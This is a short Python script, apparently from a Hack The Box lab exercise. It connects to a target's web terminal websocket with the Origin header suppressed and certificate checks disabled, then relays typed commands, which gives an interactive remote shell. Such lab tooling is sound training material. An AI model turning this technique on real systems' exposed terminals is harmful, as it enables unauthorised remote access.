#!/usr/bin/env python3
import sys, time, threading, os
import websocket

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.129.93.8"
VHOST = "nb-1be3782a8afd3ad5.cohort.htb"
URL = f"wss://{TARGET}/terminal/ws"

ws = websocket.create_connection(
    URL,
    host=VHOST,
    suppress_origin=True,
    sslopt={"cert_reqs": 0, "check_hostname": False},
    timeout=30,
)
print(f"[+] connected to {URL} host={VHOST}", flush=True)

def recv_loop():
    try:
        while True:
            data = ws.recv()
            if data is None:
                break
            sys.stdout.write(data if isinstance(data, str) else data.decode(errors="replace"))
            sys.stdout.flush()
    except Exception as e:
        pass
    print("\n[+] recv closed", flush=True)

t = threading.Thread(target=recv_loop, daemon=True)
t.start()
time.sleep(0.8)

try:
    while True:
        line = sys.stdin.readline()
        if not line:
            break
        ws.send(line)
except KeyboardInterrupt:
    pass
time.sleep(int(os.environ.get('KEEPALIVE','45')))
ws.close()
